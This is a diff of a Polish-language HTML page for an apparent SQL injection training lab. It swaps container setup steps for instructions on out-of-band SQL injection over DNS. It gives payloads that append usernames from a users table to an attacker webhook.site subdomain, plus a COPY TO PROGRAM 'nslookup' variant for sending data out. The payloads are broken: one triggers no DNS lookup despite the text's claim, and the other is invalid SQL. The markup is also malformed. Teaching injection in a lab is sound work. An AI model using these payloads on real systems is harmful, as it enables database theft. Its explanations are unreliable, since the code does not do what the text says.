@@ -9,26 +9,49 @@
 <body>
     <div class="container mt-5 p-4 border rounded shadow-sm bg-white">
         <h1 class="text-primary">Out of band SQLI</h1>
-        <p>Celem zadania jest zalogować się na konto określonego użytkownika bez znania hasła.</p>
-        <h2>Instrukcje instalacji kontenera</h2>
-        <p>Postępuj zgodnie z poniższymi krokami, aby zainstalować i uruchomić kontener:</p>
+        <h2>Instrukcje przeprowadzenia ataku OOB SQL Injection (OOB SQLi) z zapytaniami DNS</h2>
+        <p>Postępuj zgodnie z poniższymi krokami, aby przeprowadzić atak OOB SQL Injection przy użyciu zapytań DNS, które przechwycą dane z bazy danych.</p>
         
         <div class="card">
             <div class="card-body">
-                <h4 class="card-title">1. Pobierz obraz kontenera</h4>
-                <p>Najpierw musisz pobrać obraz kontenera z Docker Hub. Użyj poniższego polecenia:</p>
-                <pre><code>docker pull khebda/oob_sqli1:latest</code></pre>
-                
-                <h4 class="card-title">2. Uruchom kontener</h4>
-                <p>Aby uruchomić kontener, użyj poniższego polecenia:</p>
-                <pre><code>docker run --name oob_sqli1 -p 5432:5432 -v nowy_volume4:/var/lib/postgresql/data khebda/oob_sqli1:latest</code></pre>
-                <p>Po uruchomieniu kontenera, aplikacja będzie dostępna na porcie <code>5432</code>. Teraz musisz połączyć się z bazą danych PostgreSQL, aby rozpocząć próby obejścia mechanizmu autoryzacji.</p>
-    
-                <h4 class="card-title">3. Wejdź do kontenera</h4>
-                <p>Wejdź do uruchomionego kontenera, aby rozpocząć pracę w środowisku:</p>
-                <pre><code>docker exec -it oob_sqli1 bash</code></pre>
+                <h4 class="card-title">1. Przygotowanie serwera DNS (np. DNSLog)</h4>
+                <p>Najpierw musisz przygotować serwer DNS, który będzie przechwytywał zapytania. Możesz użyć jednej z dostępnych usług, jak np. DNSLog, aby monitorować zapytania DNS, które będą wysyłane przez aplikację. Zarejestruj się na jednym z serwisów do monitorowania zapytań DNS.</p>
+                <p>Przykład serwisu: <a href="https://webhook.site/" target="_blank">https://webhook.site/</a></p>
+                <p>Na webhook.site otrzymasz unikalny adres, który będzie działał jako subdomena, np. <code>xxxxxxxx.webhook.site.</code>.</p>
+                <p>Niestety strona ma ograniczenia do 100 zapytań dlatego, gdy narzucimy ich za dużo baza może zwrócić błąd. Mimo wszystko będziemy mogli ich część zaobserować an stronie w okinku po prawej </p>
+
+                <h4 class="card-title">2. Przygotowanie injekcji SQL z zapytaniem DNS</h4>
+                <p>Aby przeprowadzić atak, musisz wstrzyknąć zapytanie SQL, które wyśle zapytanie DNS na Twój serwer DNS. Do tego celu wykorzystamy funkcję <code>COPY TO PROGRAM</code>, aby wykonać zapytanie systemowe, jak np. <code>nslookup</code>.</p>
+                <p>Przykład injekcji SQL, która wysyła zapytanie DNS na Twoją subdomenę:</p>
+                <pre><code>' UNION SELECT 1, CONCAT(username, '.xxxxxxxx.webhook.site') FROM users --</code></pre>
+                <p>W tej injekcji:</p>
+                <ul>
+                    <li><code>username</code> to kolumna w tabeli <code>users</code>, która zawiera dane użytkowników (np. nazwy użytkowników).</li>
+                    <li><code>CONCAT(username, '.xxxxxxxx.webhook.site')</code> łączy nazwę użytkownika z subdomeną, tworząc zapytanie DNS.</li>
+                </ul>
+        
+                <h4 class="card-title">3. Alternatywnie - Użycie COPY TO PROGRAM i nslookup</h4>
+                <p>Jeśli aplikacja pozwala na wykonanie zapytań systemowych, możesz użyć funkcji <code>COPY TO PROGRAM</code>, aby uruchomić zapytanie <code>nslookup</code>, które będzie próbowało rozwiązać zapytanie DNS.</p>
+                <p>Przykład injekcji z użyciem <code>COPY TO PROGRAM</code> i <code>nslookup</code>:</p>
+                <pre><code>' UNION SELECT 1, COPY (SELECT CONCAT(username, '.xxxxxxxx.webhook.site') FROM users) TO PROGRAM 'nslookup' --</code></pre>
+                <p>W tej injekcji SQL:</p>
+                <ul>
+                    <li<Funkcja <code>COPY TO PROGRAM</code> wykonuje zapytanie systemowe i wysyła zapytanie DNS na Twój serwer DNS.</li>
+                    <li>Zapytanie DNS będzie wyglądać jak np. <code>alice.xxxxxxxx.webhook.site</code> (gdzie <code>alice</code> to wartość z bazy danych).</li>
+                </ul>
+        
+                <h4 class="card-title">4. Wykonanie ataku i monitorowanie wyników</h4>
+                <p>Wprowadź injekcję SQL w aplikacji, w której podejrzewasz podatność na SQL Injection. Zapytanie DNS zostanie wysłane, a dane z bazy danych (np. nazwy użytkowników) pojawią się na Twoim serwerze DNS.</p>
+                <ul>
+                    <li>Po wykonaniu ataku, przejdź na stronę DNSLog, aby monitorować zapytania DNS, które zostały wysłane do Twojej subdomeny (np. <code>xxxxxxxx.webhook.site</code>).</li>
+                    <li>Zobaczysz zapytania, które zawierają dane z bazy danych (np. nazwę użytkownika), które zostały wyciągnięte przez atak.</li>
+                </ul>
+        
+                <h4 class="card-title">5. Analiza danych</h4>
+                <p>Po przeprowadzeniu ataku, przeanalizuj zapytania DNS na stronie DNSLog, aby zobaczyć dane, które zostały przechwycone przez Twój serwer DNS. Możesz wykorzystać te informacje do dalszych działań lub weryfikacji podatności aplikacji.</p>
             </div>
         </div>
+        
             {% include "login.html" %}
 
         <div id="result" class="mt-4"></div>
